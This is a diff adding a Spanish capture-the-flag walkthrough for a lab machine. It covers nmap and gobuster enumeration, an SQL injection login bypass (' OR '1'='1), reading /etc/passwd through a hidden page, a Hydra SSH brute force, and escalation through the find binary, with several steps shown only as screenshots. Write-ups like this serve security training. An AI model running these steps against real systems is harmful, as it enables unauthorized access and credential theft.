@@ -1,8 +1,109 @@
-<h1 align="center">Bocata de Calamares</h1>
+# Bocata de Calamares
 
 ## 0. HERRAMIENTAS
 
-- Hydra
-- Binario perl
+- SQLi
+- Base64
+- Binario find
 
 ## 1. ENUMERACIÓN
+
+Hacemos una búsqueda de ips en nuestra red
+
+```jsx
+sudo arp-scan -I eth0 --localnet
+```
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image.png)
+
+Lanzamos un nmap 
+
+```jsx
+sudo nmap -p- -open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 192.168.31.164
+```
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%201.png)
+
+Vemos los puertos abiertos:
+
+- 22
+- 80
+
+Accedemos a la url 
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%202.png)
+
+Dentro de “Expertos advierten un nuevo peligro…” vemos una pequeña guía de SQL Injection sqli.php
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%203.png)
+
+Con gobuster buscamos directorios
+
+```jsx
+sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u '[http://192.168.31.164](http://192.168.31.164/)' -x 'php,py,sh,,html,txt,jpg'
+```
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%204.png)
+
+Vemos el directorio login.php y admin.php, la segunda no muestra nada.
+
+## 2. COMPROMISO DEL ENTORNO
+
+Login.php muestra una pantalla de acceso. Probaremos haciendo una SQLi
+
+```
+ Usuario: admin
+ Contraseña: ' OR '1'='1
+```
+
+Accedemos correctamente
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%205.png)
+
+Accedemos al enlace to-do-list que indica
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%206.png)
+
+En el tercer punto nos está dando una pista 
+
+He creado una nueva página para poder leer los ficheros internos del servidor, cada día soy un mejor programador. Además he codificado su nombre en base64, así nadie podrá dar con ella (lee_archivos).
+
+Hay una pagina en base64 donde podemos meter comandos, seguramente sea lee_archivos
+
+Ciframos 
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%207.png)
+
+Y efectivamente vemos que existe la página y podemos buscar los usuarios de /etc/passwd
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%208.png)
+
+Encontramos al usuario superadministrator, intentaremos encontrar su contraseña con Hydra
+
+```jsx
+hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt 192.168.31.164 ssh
+```
+
+Nos encuentra la contraseña
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%209.png)
+
+Accedemos por ssh correctamente
+
+Encontramos la primera flag
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%2010.png)
+
+## 3. ESCALACION DE PRIVILEGIOS
+
+Buscamos binarios que podamos ejecutar
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%2011.png)
+
+En https://gtfobins.github.io/ encontramos el siguiente binario /usr/bin/find
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%2012.png)
+
+Conseguimos la elevación de privilegios y localizar la segunda flag
+
+![image.png](Bocata%20de%20Calamares%2017c60a16f8a180deb269eacab73f036a/image%2013.png)
